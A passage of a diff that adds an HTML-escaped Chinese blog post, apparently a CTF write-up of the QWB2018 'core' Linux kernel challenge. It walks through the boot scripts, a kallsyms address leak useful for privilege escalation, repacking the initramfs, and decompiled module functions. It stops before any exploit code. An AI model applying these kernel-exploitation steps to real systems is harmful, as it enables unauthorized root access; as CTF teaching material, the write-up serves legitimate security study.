+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;give_to_player &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;master●●&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; ls
+bzImage  core.cpio  start.sh  vmlinux
+give_to_player &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;master●●&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; bat start.sh 
+───────┬─────────────────────────────────────────────────────────────────────────────────
+       │ File: start.sh
+───────┼─────────────────────────────────────────────────────────────────────────────────
+   &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;   │ qemu-system-x86_64 &lt;span class=&#34;se&#34;&gt;\
+&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;   │ -m 64M &lt;span class=&#34;se&#34;&gt;\
+&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;   │ -kernel ./bzImage &lt;span class=&#34;se&#34;&gt;\
+&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;   │ -initrd  ./core.cpio &lt;span class=&#34;se&#34;&gt;\
+&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt;   │ -append &lt;span class=&#34;s2&#34;&gt;&amp;#34;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&amp;#34;&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
+&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt;   │ -s  &lt;span class=&#34;se&#34;&gt;\
+&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt;   │ -netdev user,id&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;t0, -device e1000,netdev&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;t0,id&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;nic0 &lt;span class=&#34;se&#34;&gt;\
+&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;8&lt;/span&gt;   │ -nographic  &lt;span class=&#34;se&#34;&gt;\
+&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;───────┴─────────────────────────────────────────────────────────────────────────────────&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;发现内核开启了 kaslr 保护。&lt;/p&gt;
+
+&lt;p&gt;解压 &lt;code&gt;core.cpio&lt;/code&gt; 后，看一下 init&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;give_to_player &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;master●&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; file core.cpio 
+core.cpio: gzip compressed data, last modified: Fri Mar &lt;span class=&#34;m&#34;&gt;23&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;13&lt;/span&gt;:41:13 &lt;span class=&#34;m&#34;&gt;2018&lt;/span&gt;, max compression, from Unix, original size &lt;span class=&#34;m&#34;&gt;53442048&lt;/span&gt;
+give_to_player &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;master●&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; mkdir core
+give_to_player &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;master●&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; core 
+core &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;master&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; mv ../core.cpio core.cpio.gz
+core &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;master●&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; gunzip ./core.cpio.gz 
+core &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;master●&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; cpio -idm &amp;lt; ./core.cpio
+&lt;span class=&#34;m&#34;&gt;104379&lt;/span&gt; 块
+core &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;master●&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; bat init 
+───────┬─────────────────────────────────────────────────────────────────────────────────
+       │ File: init
+───────┼─────────────────────────────────────────────────────────────────────────────────
+   &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;   │ &lt;span class=&#34;cp&#34;&gt;#!/bin/sh
+&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;   │ mount -t proc proc /proc
+   &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;   │ mount -t sysfs sysfs /sys
+   &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;   │ mount -t devtmpfs none /dev
+   &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt;   │ /sbin/mdev -s
+   &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt;   │ mkdir -p /dev/pts
+   &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt;   │ mount -vt devpts -o &lt;span class=&#34;nv&#34;&gt;gid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;,mode&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;620&lt;/span&gt; none /dev/pts
+   &lt;span class=&#34;m&#34;&gt;8&lt;/span&gt;   │ chmod &lt;span class=&#34;m&#34;&gt;666&lt;/span&gt; /dev/ptmx
+   &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt;   │ cat /proc/kallsyms &amp;gt; /tmp/kallsyms
+  &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt;   │ &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &amp;gt; /proc/sys/kernel/kptr_restrict
+  &lt;span class=&#34;m&#34;&gt;11&lt;/span&gt;   │ &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &amp;gt; /proc/sys/kernel/dmesg_restrict
+  &lt;span class=&#34;m&#34;&gt;12&lt;/span&gt;   │ ifconfig eth0 up
+  &lt;span class=&#34;m&#34;&gt;13&lt;/span&gt;   │ udhcpc -i eth0
+  &lt;span class=&#34;m&#34;&gt;14&lt;/span&gt;   │ ifconfig eth0 &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt;.0.2.15 netmask &lt;span class=&#34;m&#34;&gt;255&lt;/span&gt;.255.255.0
+  &lt;span class=&#34;m&#34;&gt;15&lt;/span&gt;   │ route add default gw &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt;.0.2.2 
+  &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt;   │ insmod /core.ko
+  &lt;span class=&#34;m&#34;&gt;17&lt;/span&gt;   │ 
+  &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt;   │ poweroff -d &lt;span class=&#34;m&#34;&gt;120&lt;/span&gt; -f &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;
+  &lt;span class=&#34;m&#34;&gt;19&lt;/span&gt;   │ setsid /bin/cttyhack setuidgid &lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt; /bin/sh
+  &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt;   │ &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;sh end!\n&amp;#39;&lt;/span&gt;
+  &lt;span class=&#34;m&#34;&gt;21&lt;/span&gt;   │ umount /proc
+  &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt;   │ umount /sys
+  &lt;span class=&#34;m&#34;&gt;23&lt;/span&gt;   │ 
+  &lt;span class=&#34;m&#34;&gt;24&lt;/span&gt;   │ poweroff -d &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  -f
+───────┴────────────────────────────&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;发现了几处有意思的地方：&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;第 9 行中把 &lt;code&gt;kallsyms&lt;/code&gt; 的内容保存到了 &lt;code&gt;/tmp/kallsyms&lt;/code&gt; 中，那么我们就能从 &lt;code&gt;/tmp/kallsyms&lt;/code&gt; 中读取 &lt;code&gt;commit_creds&lt;/code&gt;，&lt;code&gt;prepare_kernel_cred&lt;/code&gt; 的函数的地址了&lt;/li&gt;
+&lt;li&gt;第 10 行把 &lt;code&gt;kptr_restrict&lt;/code&gt; 设为 1，这样就不能通过 &lt;code&gt;/proc/kallsyms&lt;/code&gt; 查看函数地址了，但第 9 行已经把其中的信息保存到了一个可读的文件中，这句就无关紧要了&lt;/li&gt;
+&lt;li&gt;第 11 行把 &lt;code&gt;dmesg_restrict&lt;/code&gt; 设为 1，这样就不能通过 &lt;code&gt;dmesg&lt;/code&gt; 查看 kernel 的信息了&lt;/li&gt;
+&lt;li&gt;第 18 行设置了定时关机，为了避免做题时产生干扰，直接把这句删掉然后重新打包&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;同时还发现了一个 shell 脚本 &lt;code&gt;gen_cpio.sh&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;core &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;master●&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; bat gen_cpio.sh 
+───────┬─────────────────────────────────────────────────────────────────────────────────
+       │ File: gen_cpio.sh
+───────┼─────────────────────────────────────────────────────────────────────────────────
+   &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;   │ find . -print0 &lt;span class=&#34;se&#34;&gt;\
+&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;   │ &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; cpio --null -ov --format&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;newc &lt;span class=&#34;se&#34;&gt;\
+&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;   │ &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; gzip -9 &amp;gt; &lt;span class=&#34;nv&#34;&gt;$1&lt;/span&gt;
+───────┴─────────────────────────────────────────────────────────────────────────────────&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;从名称和内容都可以看出这是一个方便打包的脚本，我们修改好 init 后重新打包，尝试运行 kernel&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;core &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;master●●&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; vim init 
+core &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;master●●&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rm core.cpio 
+core &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;master●●&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; ./gen_cpio.sh core.cpio
+.
+./usr
+./usr/sbin
+./usr/sbin/popmaildir
+......
+......
+./core.cpio
+./core.ko
+&lt;span class=&#34;m&#34;&gt;129851&lt;/span&gt; 块
+core &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;master●●&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; ls
+bin        core.ko  gen_cpio.sh  lib    linuxrc  root  sys  usr
+core.cpio  etc      init         lib64  proc     sbin  tmp  vmlinux
+core &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;master●●&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; mv core.cpio ..
+core &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;master●●&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; ..
+give_to_player &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;master●●&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; ./start.sh &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;但这时候又遇到了新问题，内核运行不起来，从一闪即逝的报错信息中能看到是因为分配的内存过小，&lt;code&gt;start.sh&lt;/code&gt; 中 &lt;code&gt;-m&lt;/code&gt; 分配的是 64M，修改为 128M，终于能运行起来了。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;/ $ lsmod
+core &lt;span class=&#34;m&#34;&gt;16384&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; - Live 0x0000000000000000 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;O&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+......
+......
+give_to_player &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;master●●&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; cp core/core.ko .
+give_to_player &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;master●●&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; check ./core.ko
+./core.ko: ELF &lt;span class=&#34;m&#34;&gt;64&lt;/span&gt;-bit LSB relocatable, x86-64, version &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SYSV&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, BuildID&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;sha1&lt;span class=&#34;o&#34;&gt;]=&lt;/span&gt;549436683d
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;/home/m4x/pwn_repo/QWB2018_core/give_to_player/core.ko&amp;#39;&lt;/span&gt;
+    Arch:     amd64-64-little
+    RELRO:    No RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0x0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;可以看出开启了 canary 保护，用 IDA 打开进一步分析。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;init_module()&lt;/strong&gt; 注册了 &lt;code&gt;/proc/core&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-C&#34; data-lang=&#34;C&#34;&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-C&#34; data-lang=&#34;C&#34;&gt;&lt;span class=&#34;kr&#34;&gt;__int64&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;init_module&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+  &lt;span class=&#34;n&#34;&gt;core_proc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;proc_create&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;core&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;438LL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0LL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;core_fops&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+  &lt;span class=&#34;n&#34;&gt;printk&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x016c&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;ore: created /proc/core entry&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0LL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;&lt;strong&gt;exit_core()&lt;/strong&gt; 删除 &lt;code&gt;/proc/core&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-C&#34; data-lang=&#34;C&#34;&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-C&#34; data-lang=&#34;C&#34;&gt;&lt;span class=&#34;kr&#34;&gt;__int64&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;exit_core&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+  &lt;span class=&#34;kr&#34;&gt;__int64&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// rax
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
+  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;core_proc&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+    &lt;span class=&#34;n&#34;&gt;result&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remove_proc_entry&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;core&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
